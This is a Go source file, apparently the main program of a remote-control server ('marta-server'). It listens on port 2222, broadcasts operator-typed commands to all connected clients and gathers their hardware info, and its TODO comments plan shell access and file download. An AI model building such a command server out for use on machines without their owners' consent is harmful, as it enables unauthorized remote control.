// server

package main

import (
	"bufio"
	"fmt"
	"os"
	"strings"

	"github.com/karastift/marta-server/home"
	"github.com/karastift/marta-server/world"
)

var clients = world.NewClients()

func main() {

	// TODO:
	// status command on server
	// check out memory modules on ghw
	// check out ghw in general
	// get right macaddress

	// use real logging package "log"

	// shell access (could be hard)
	// file download (could be hard)
	// client sends info with login command
	// maybe update command (could be hard)

	pool := home.NewPool(clients, 2222)

	go pool.Start()

	testResponses()
}

func info() {
	clients.RequestInfo()

	for _, client := range clients.ClientsArray {
		fmt.Println(client.Info.String())
	}
}

func testResponses() {
	reader := bufio.NewReader(os.Stdin)

	for {
		fmt.Print("> ")

		in, _ := reader.ReadString('\n')

		if in == "!info\n" {
			info()
			continue
		}

		responses := clients.SendWithRes(in)

		for _, res := range responses {
			fmt.Println("'" + strings.TrimRight(res, "\n") + "'")
		}

		for _, client := range clients.ClientsArray {
			fmt.Println(client.Conn.RemoteAddr())
		}
	}
}
